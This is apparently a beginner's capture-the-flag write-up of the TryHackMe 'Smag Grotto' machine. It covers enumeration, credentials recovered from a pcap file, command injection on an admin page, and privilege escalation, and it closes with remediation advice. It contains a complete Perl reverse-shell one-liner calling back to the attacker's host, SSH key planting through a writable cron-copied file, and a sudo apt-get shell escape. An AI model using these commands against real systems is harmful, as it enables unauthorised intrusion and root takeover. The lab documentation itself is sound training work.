<p align="center">
  THM : CTF Smag Grotto<br>
  <img src="https://i.imgur.com/o08Runb.png">
</p>

## Table of contents
- [Step 1 : Nmap Scan](#step-1--nmap-scan)
- [Step 2 : Website enumeration](#step-2--website-enumeration)
- [Step 3 : Exploiting the website to get a reverse-shell](#step-3--exploiting-the-website-to-get-a-reverse-shell)
- [Step 4 : Get access to another user than www-data](#step-4--get-access-to-another-user-than-www-data)
- [Final step : Privilège escalation](#final-step--privilege-escalation)
- [Conclusion](#conclusion)


## Step 1 : NMAP Scan
First , we need to scan the target to find open ports.  
```nmap 10.10.21.185 -A -oN nmapResult``` (I always store the nmap scan result in a file).    
![alt text](https://i.imgur.com/qnZT0cl.png)  
We see 2 open ports :  
- port 22 for ssh  
- port 80 for http -> the target has a website that we can enumerate.  

## Step 2 : Website enumeration
Let's see the website  
![alt text](https://i.imgur.com/PSy4ni0.png)  
Ok, so now we know that this website is under development.  
I start a dirb scan on the target website.
```dirb http://10.10.21.185/ -o dirbResult```  
(Same as nmap, i always store dirb scan result in a file).  
![alt text](https://i.imgur.com/Ezv6GfQ.png)  
We see that dirb found a mail directory ! Let's see what we have at ```http://10.10.21.185/mail/```  
![alt text](https://i.imgur.com/uME2QT1.png)  
There is a pcap file. This can be really useful to find credentials used to connect to the target with diferrent protocols.  
Also, we have three possible logins : 
- ```netadmin@smag.thm```  
- ```uzi@smag.thm```  
- ```jake@smag.thm```  


We also maybe have a domain name : smag.thm  
![alt text](https://i.imgur.com/9p3t4NF.png)  



So we found some interesting things in this pcap file :   
- In the pcap file, there is a hostname : ```development.smag.thm```  
- There is also credentials used in a login.php page  

To access the website development section, I added the line ```10.10.21.185    development.smag.thm``` to the file ```/etc/hosts``` on my machine.  
Now, if I enter ```http://development.smag.thm/``` in the address bar, i enter the hidden development section of the website.  
![alt text](https://i.imgur.com/zSFc88j.png)  


There is two files in here :
- admin.php -> if not logged in, it redirects us to login.php.  
- login.php -> here we can use the credentials we found before in the pcap file.  


So let's try to use the credentials we found in the pcap file to login on the login.php page.
![alt text](https://i.imgur.com/SmbKqGc.png)  


And we are logged in !  
We are automatically redirected to admin.php.  
![alt text](https://i.imgur.com/puRBFr4.png)  

## Step 3 : Exploiting the website to get a reverse-shell
In this page, I tried ```ls``` and ```whoami``` but there was no output. But we can try to get a reverse shell with this command input. I used a perl reverse shell found at https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/  
```
perl -e 'use Socket;$i="10.x.x.x";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```  
So I set a netcat listener on port 1234. ```nc -lnvp 1234```, then I send the reverse shell command to the website, and I got a reverse shell !  
![alt test](https://i.imgur.com/Clnpl84.png)  


Let's get a bit more stable shell with python, ```python3 -c 'import pty; pty.spawn("/bin/bash")'```.  
![alt text](https://i.imgur.com/bHf9Wk3.png)  
(And yes the ip address of the target has changed, it's because I restarted the machine... it's a long story...)  

## Step 4 : Get access to another user than www-data
Now that we have a better shell, we can try to read the file ```/etc/passwd```to see users list on this machine ```cat /etc/passwd```.  
![alt text](https://i.imgur.com/4JoLmKd.png)  


We have the user jake, remember, we saw this name before in the /mail directory of the website.  So maybe we can try to connect to the machine as jake. But how can do this ? First I looked in the jake's home directory ```/home/jake```.  
![alt text](https://i.imgur.com/J1zPHY0.png)  


We can see that there is a file named ```.sudo_as_admin_successful```, that means that the user jake succesfully executed a command with sudo in the past. We can keep that in mind. We can't read any useful files, and we can't even go to the .ssh directory to try to find private ssh key... The next thing i've done was to check the crontab ```cat /etc/crontab```. 
![alt text](https://i.imgur.com/Lr8wf9Z.png)


One interesting thing here is that we have a cron task that copy ```/opt/.backups/jake_id_rsa.pub.backup``` to ```/home/jake/.ssh/authorized_keys```. The copied file is probably a public SSH key. After a little bit of research, I found something interesting about SSH public keys here : https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/. As I thought, it is possible to add our own public key to the authorized_keys file to then connect to the target without any password.  

So let's check if we can write to the ```/opt/.backups/jake_id_rsa.pub.backup```file with ```ls -l /opt/.backups/jake_id_rsa.pub.backup```.  
![alt text](https://i.imgur.com/YxCuEme.png)  


And we see that everybody can write to this file... Now we just have to create our own SSH keys and then copy our own public key to this file to connect with SSH as user jake. To generate our own keys, we need to use ```ssh-keygen -f jake_id_rsa```.  
![alt text](https://i.imgur.com/OWYhdS2.png)  


We now have two files :
- jake_id_rsa -> the private key we are going to use to connect with SSH.
- jake_id_rsa.pub -> the public key we need to copy to the ```/opt/.backups/jake_id_rsa.pub.backup``` file.  

I read the content of the public key file on my computer, and then I use ```echo '<MY PUBLIC KEY>' > /opt/.backups/jake_id_rsa.pub.backup``` on the target machine. Also, don't forget to set the right permissions for the private SSH key with ```chmod 600 jake_id_rsa```. And the we can connect with SSH as jake to the machine with ```ssh jake@10.10.24.178 -i jake_id_rsa```.  
![alt text](https://i.imgur.com/CgAIAtx.png)


We are now logged in as jake ! And we can now get the user.txt flag using ```cat user.txt```  
![alt text](https://i.imgur.com/bhPQu8t.png)

## Final step : Privilege Escalation
Now, it's time to get root ! Remember, we found a file named ```.sudo_as_admin_successful```, that means that user jake has already used a command with sudo in the past, so maybe jake has the permission to use a command with sudo without a password. To see this , we use ```sudo -l``` :  
![alt text](https://i.imgur.com/mDH59MY.png)  


We see that user jake can use sudo apt-get, and so execute the apt-get command as root without any password ! Let's see on [GTFOBins](https://gtfobins.github.io/) if we can execute a shell by using apt-get.  
![alt text](https://i.imgur.com/OQHoMBe.png)  
And yes we can ! By using ```sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh```.  
![alt text](https://i.imgur.com/NhQZMuR.png)  
And we have a root shell ! Now we can get the root flag with ```cat /root/root.txt```.  
![alt text](https://i.imgur.com/Ln7GE8p.png)  


## Conclusion
- Mails shouldn't be publicly accessible.
- There shouldn't be a publicly accessible pcap file.
- www-data user should'nt have write permissions on the file ```/opt/.backups/jake_id_rsa_pub.backup```. Maybe we can change the owner of the file with ```chown jake /opt/.backups/jake_id_rsa_pub.backup```and then, delete the write permission for other users than jake with ```chmod 600 /opt/.backups/jake_id_rsa_pub.backup```. So now only user jake can read or write to this file.
- Maybe we can filter commands on the website to avoid reverse shells

Thanks for reading my first write up ! (PS : I'm a beginner in pentesting and CTFs and english is not my native language).
